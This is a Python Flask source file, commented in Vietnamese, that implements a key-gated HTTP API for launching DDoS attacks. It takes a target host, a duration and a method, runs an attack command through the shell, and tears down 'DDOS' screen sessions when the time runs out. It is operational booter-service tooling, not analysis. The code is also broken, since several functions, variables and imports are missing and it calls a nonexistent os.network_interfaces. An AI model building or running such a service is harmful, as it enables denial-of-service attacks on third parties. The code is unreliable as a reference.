from flask import Flask, request, jsonify
import threading
import re
import subprocess
import os

app = Flask(__name__)
port = 8229

# Hàm tạo key ngẫu nhiên
def generate_random_key():
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    key_length = 20
    return ''.join(random.choice(characters) for _ in range(key_length))

# Hàm lấy địa chỉ IP của VPS
def get_ip_address():
    interfaces = os.network_interfaces()
    for interface in interfaces:
        for addr_info in interfaces[interface]:
            if addr_info.family == socket.AF_INET and not addr_info.internal:
                return addr_info.address
    return 'localhost'

# Hàm xóa nội dung của tệp attack.txt
def clear_attack_file():
    with open('attack.txt', 'w') as file:
        file.write('')

# Hàm cập nhật để xóa nội dung trong tệp attack.txt sau khi cuộc tấn công đã kết thúc
def clear_attack_after_time(time):
    time.sleep(time)
    clear_attack_file()

# Hàm dừng cuộc tấn công
def stop_attack_after_time(time):
    time.sleep(time)
    stop_command = f'screen -ls | grep DDOS | cut -d. -f1 | awk \'{{print $1}}\' | xargs -I % screen -X -S % quit'
    subprocess.run(stop_command, shell=True)
    clear_attack_file()

# Endpoint để thực hiện cuộc tấn công
@app.route('/attack', methods=['POST'])
def perform_attack():
    data = request.get_json()

    host = data.get('host', '')
    time_duration = data.get('time', '')
    method = data.get('method', '')
    client_key = data.get('key', '')

    # Kiểm tra key hợp lệ
    if client_key not in key_list:
        return 'Bạn không có quyền truy cập API', 401

    # Chuyển method về chữ thường
    method = method.lower()

    # Kiểm tra xem method có hợp lệ hay không
    if method not in supported_methods:
        return 'Method không hợp lệ', 400

    # Kiểm tra tính hợp lệ của host
    if not is_valid_host(host):
        return 'Host không hợp lệ', 400

    # Kiểm tra tính hợp lệ của tham số time
    if not is_valid_time(time_duration):
        return 'Time không hợp lệ', 400

    try:
        # Đọc tệp attack.txt để kiểm tra xem đã có cuộc tấn công nào hay không
        with open('attack.txt', 'r') as file:
            data = file.read().strip()
            if data:
                return f'Đang tấn công mục tiêu: {data}, vui lòng thử lại sau.', 400

        key = generate_random_key()
        attack_info[key] = {'host': host, 'time_duration': time_duration, 'method': method}

        # Ghi thông tin cuộc tấn công vào tệp attack.txt
        with open('attack.txt', 'w') as file:
            file.write(f'{host} trong {time_duration} giây bằng method {method}')

        # Chọn lệnh attack tương ứng với method
        attack_command = get_attack_command(method, host, time_duration)

        # Khởi động cuộc tấn công
        if attack_command:
            subprocess.run(attack_command, shell=True)
            response = f'Bắt đầu tấn công mục tiêu: {host} trong {time_duration} giây bằng method {method}'

            # Thiết lập hẹn giờ để xóa nội dung trong file attack.txt sau khi cuộc tấn công kết thúc
            clear_attack_after_time_thread = threading.Thread(target=clear_attack_after_time, args=(time_duration,))
            clear_attack_after_time_thread.start()

            # Thiết lập hẹn giờ để dừng cuộc tấn công sau khi hết thời gian
            stop_attack_thread = threading.Thread(target=stop_attack_after_time, args=(time_duration,))
            stop_attack_thread.start()

            return {'key': key, 'message': response}
    except Exception as e:
        return f'Lỗi khi thực hiện cuộc tấn công: {e}', 500

# Endpoint để kiểm tra trạng thái của cuộc tấn công
@app.route('/attack/status/<key>', methods=['GET'])
def get_attack_status(key):
    if key not in attack_info:
        return 'Không có thông tin cuộc tấn công cho key này', 404

    return jsonify(attack_info[key])

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=port)
